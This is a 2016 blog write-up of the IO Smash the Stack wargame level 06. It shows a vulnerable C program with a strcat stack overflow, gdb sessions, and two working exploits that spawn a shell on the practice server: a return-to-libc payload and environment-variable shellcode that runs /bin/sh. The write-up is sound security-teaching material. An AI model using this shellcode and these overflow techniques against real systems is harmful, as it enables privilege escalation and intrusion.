+++
title = "IO Smash the stack level 06"
date = "2016-01-28T15:16:00-02:00"
publishdate = "2016-01-28"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-06"
project_url = "https://greyhat.dk/io-smashthestack-level-06"
type = "post"
+++

## Level06

```sh
level6@io:/levels$ ls -la level06*
-r-sr-x--- 1 level7 level6 5849 Dec 18  2013 level06
-r-sr-x--- 1 level7 level6 7293 Aug 11  2010 level06_alt
-r-------- 1 level6 level6  487 Nov 14  2011 level06_alt.c
-r-------- 1 level7 level7   22 Sep 14 03:31 level06_alt.pass
-r-------- 1 level6 level6 1034 May  7  2015 level06.c
```

level6@io:/levels$ cat level06.c
```c
//written by bla
//inspired by nnp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
	char name[40];
	char password[32];
	int id;
};

void greetuser(struct UserRecord user){
	char greeting[64];
	switch(language){
		case LANG_ENGLISH:
			strcpy(greeting, "Hi "); break;
		case LANG_FRANCAIS:
			strcpy(greeting, "Bienvenue "); break;
		case LANG_DEUTSCH:
			strcpy(greeting, "Willkommen "); break;
	}
	strcat(greeting, user.name);
	printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
	if(argc != 3) {
		printf("USAGE: %s [name] [password]\n", argv[0]);
		return 1;
	}

	struct UserRecord user = {0};
	strncpy(user.name, argv[1], sizeof(user.name));
	strncpy(user.password, argv[2], sizeof(user.password));

	char *envlang = getenv("LANG");
	if(envlang)
		if(!memcmp(envlang, "fr", 2))
			language = LANG_FRANCAIS;
		else if(!memcmp(envlang, "de", 2))
			language = LANG_DEUTSCH;

	greetuser(user);
}
```

Oki the insecure function here is strcat and the overflow occurs when adding to greeting. In order to exploit it we need to add some data hence exporting LANG

```sh
level6@io:/levels$ export LANG=de
level6@io:/levels$ gdb -q level06
Reading symbols from /levels/level06...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "A" * 40 + " " + "B" * 40')
Starting program: /levels/level06 $(python -c 'print "A" * 40 + " " + "B" * 40')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/100xw $esp
0xbffffbd0:	0x00424242	0x41414141	0x41414141	0x41414141
0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbf0:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffc00:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffc10:	0x42424242	0x42424242	0x00000000	0x00000001
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffc50:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffc60:	0x42424242	0x42424242	0x00000000	0xbfffffa5
0xbffffc70:	0xb7e9e515	0xb7ff0590	0x080486db	0xb7fceff4
0xbffffc80:	0x00000000	0x00000000	0xbffffd08	0xb7e85e46
0xbffffc90:	0x00000003	0xbffffd34	0xbffffd44	0xb7fe08d8
0xbffffca0:	0xb7ff6821	0xffffffff	0xb7ffeff4	0x080482da
0xbffffcb0:	0x00000001	0xbffffcf0	0xb7fefc16	0xb7fffac0
0xbffffcc0:	0xb7fe0bd0	0xb7fceff4	0x00000000	0x00000000
0xbffffcd0:	0xbffffd08	0x1d82ddcf	0x32c7ebdf	0x00000000
0xbffffce0:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffcf0:	0x00000000	0xb7ff59c0	0xb7e85d6b	0xb7ffeff4
0xbffffd00:	0x00000003	0x08048430	0x00000000	0x08048451
0xbffffd10:	0x08048593	0x00000003	0xbffffd34	0x080486d0
0xbffffd20:	0x080486c0	0xb7ff0590	0xbffffd2c	0xb7fff908
0xbffffd30:	0x00000003	0xbffffe43	0xbffffe53	0xbffffe7c
0xbffffd40:	0x00000000	0xbffffea5	0xbffffeb5	0xbffffec9
0xbffffd50:	0xbffffedc	0xbffffee8	0xbfffff0f	0xbfffff1b
```

Oki so we can overwrite the return adress but look at the stack. Its mixed with A's and B's and contains a 0x00000000. I haven't tried the 'return 2 libc' before so I wanted to give it a spin. In order for this to work we need to create our own fake stack like so

[ address of exit] [ address of '/bin/sh' ] [ AAAA ... ] .. [ BBBB ...] [ address of system ]

```sh
level6@io:/levels$ gdb -q level06
Reading symbols from /levels/level06...(no debugging symbols found)...done.
(gdb) disassemble greetuser
Dump of assembler code for function greetuser:
   0x0804851c <+0>:	push   %ebp
   0x0804851d <+1>:	mov    %esp,%ebp
   0x0804851f <+3>:	sub    $0x58,%esp
   0x08048522 <+6>:	mov    0x8049964,%eax
   0x08048527 <+11>:	cmp    $0x1,%eax
   0x0804852a <+14>:	je     0x8048540 <greetuser+36>
   0x0804852c <+16>:	cmp    $0x2,%eax
   0x0804852f <+19>:	je     0x804855c <greetuser+64>
   0x08048531 <+21>:	test   %eax,%eax
   0x08048533 <+23>:	jne    0x8048574 <greetuser+88>
   0x08048535 <+25>:	lea    -0x48(%ebp),%eax
   0x08048538 <+28>:	movl   $0x206948,(%eax)
   0x0804853e <+34>:	jmp    0x8048574 <greetuser+88>
   0x08048540 <+36>:	lea    -0x48(%ebp),%eax
   0x08048543 <+39>:	movl   $0x6e656942,(%eax)
   0x08048549 <+45>:	movl   $0x756e6576,0x4(%eax)
   0x08048550 <+52>:	movw   $0x2065,0x8(%eax)
   0x08048556 <+58>:	movb   $0x0,0xa(%eax)
   0x0804855a <+62>:	jmp    0x8048574 <greetuser+88>
   0x0804855c <+64>:	lea    -0x48(%ebp),%eax
   0x0804855f <+67>:	movl   $0x6c6c6957,(%eax)
   0x08048565 <+73>:	movl   $0x6d6d6f6b,0x4(%eax)
   0x0804856c <+80>:	movl   $0x206e65,0x8(%eax)
   0x08048573 <+87>:	nop
   0x08048574 <+88>:	lea    0x8(%ebp),%eax
   0x08048577 <+91>:	mov    %eax,0x4(%esp)
   0x0804857b <+95>:	lea    -0x48(%ebp),%eax
   0x0804857e <+98>:	mov    %eax,(%esp)
   0x08048581 <+101>:	call   0x80483d0 <strcat@plt>
   0x08048586 <+106>:	lea    -0x48(%ebp),%eax
   0x08048589 <+109>:	mov    %eax,(%esp)
   0x0804858c <+112>:	call   0x80483f0 <puts@plt>
   0x08048591 <+117>:	leave
   0x08048592 <+118>:	ret
End of assembler dump.
(gdb) break *0x0804857e
(gdb) source /usr/local/peda/peda.py
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7eaac30 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e9e270 <exit>
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7fab194 ("/bin/sh")
gdb-peda$ r $(python -c 'print "\x70\xe2\xe9\xb7" + "\x94\xb1\xfa\xb7" + "A"*32 + " " + "B"*25 + "\x30\xac\xea\xb7"')
[----------------------------------registers-----------------------------------]
EAX: 0xbffffb50 ("Willkommen ")
EBX: 0xbffffbf0 --> 0xb7e9e270 (<exit>:	push   ebp)
ECX: 0x0
EDX: 0xbffffba0 --> 0xb7e9e270 (<exit>:	push   ebp)
ESI: 0xbffffc3c --> 0xbfffffa5 --> 0x4c006564 ('de')
EDI: 0xbffffbec --> 0x1
EBP: 0xbffffb98 --> 0xbffffc58 --> 0xbffffcd8 --> 0x0
ESP: 0xbffffb40 --> 0xb7ee7ee6 (<memcmp+6>:	add    ebx,0xe710e)
EIP: 0x804857e (<greetuser+98>:	mov    DWORD PTR [esp],eax)
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048574 <greetuser+88>:	lea    eax,[ebp+0x8]
   0x8048577 <greetuser+91>:	mov    DWORD PTR [esp+0x4],eax
   0x804857b <greetuser+95>:	lea    eax,[ebp-0x48]
=> 0x804857e <greetuser+98>:	mov    DWORD PTR [esp],eax
   0x8048581 <greetuser+101>:	call   0x80483d0 <strcat@plt>
   0x8048586 <greetuser+106>:	lea    eax,[ebp-0x48]
   0x8048589 <greetuser+109>:	mov    DWORD PTR [esp],eax
   0x804858c <greetuser+112>:	call   0x80483f0 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0xbffffb40 --> 0xb7ee7ee6 (<memcmp+6>:	add    ebx,0xe710e)
0004| 0xbffffb44 --> 0xbffffba0 --> 0xb7e9e270 (<exit>:	push   ebp)
0008| 0xbffffb48 --> 0xb7fefcf2 (lea    esi,[esi+0x0])
0012| 0xbffffb4c --> 0xb7fffac0 --> 0xb7fffa64 --> 0xb7fe0ba0 --> 0xb7fff908 --> 0x0
0016| 0xbffffb50 ("Willkommen ")
0020| 0xbffffb54 ("kommen ")
0024| 0xbffffb58 --> 0x206e65 ('en ')
0028| 0xbffffb5c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804857e in greetuser ()
gdb-peda$ x/64xw $esp
0xbffffb40:	0xb7ee7ee6	0xbffffba0	0xb7fefcf2	0xb7fffac0
0xbffffb50:	0x6c6c6957	0x6d6d6f6b	0x00206e65	0x00000000
0xbffffb60:	0x00000001	0x08048288	0x0804993c	0x00000000
0xbffffb70:	0xb7e76874	0xbffffbf0	0x00000000	0xbffffc3c
0xbffffb80:	0xbffffc58	0xb7ff59c0	0x00000002	0xb7ee7f30
0xbffffb90:	0xb7ee7f67	0x00000000	0xbffffc58	0x080486af
0xbffffba0:	0xb7e9e270	0xb7fab194	0x41414141	0x41414141
0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc0:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffbd0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffbe0:	0xeaac3042	0x000000b7	0x00000000	0x00000001
0xbffffbf0:	0xb7e9e270	0xb7fab194	0x41414141	0x41414141
0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc10:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffc20:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffc30:	0xeaac3042	0x000000b7	0x00000000	0xbfffffa5
gdb-peda$ quit
level6@io:/levels$ ./level06 $(python -c 'print "\x70\xe2\xe9\xb7" + "\x94\xb1\xfa\xb7" + "A"*32 + " " + "B"*25 + "\x30\xac\xea\xb7"')
Willkommen p�鷔��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
sh-4.2$ cat /home/level7/.pass
XXXXXXXXXXXXXXXX
```

And easier way would be just to use the EGG from level05

```sh
level6@io:/levels$ export LANG="de"
level6@io:/levels$ export EGG=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
level6@io:/levels$ /tmp/desdic1/getenv EGG /levels/level06
EGG will be at 0xbffffed3
level6@io:/levels$ /levels/level06 $(python -c 'print "A"*40 + " " + "B"*25 + "\xd3\xfe\xff\xbf"')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB����
sh-4.2$ cat /home/level7/.pass
XXXXXXXXXXXXXXXX
```


## Level06 alt

```c
#include <stdio.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <string.h>

char pass[32];

int main(int argc, char * argv[])
{

        char buf[32];
        FILE *f;

        f = fopen("/levels/level06_alt.pass", "r");

        fgets(pass, 32, f);
        fgets(buf, 999, stdin);

        if(!strcmp(buf, pass)) {
                printf("Success!\n");
                setreuid(geteuid(), geteuid());
                execl("/bin/sh", NULL, NULL);
        }

        return 0;
}
```
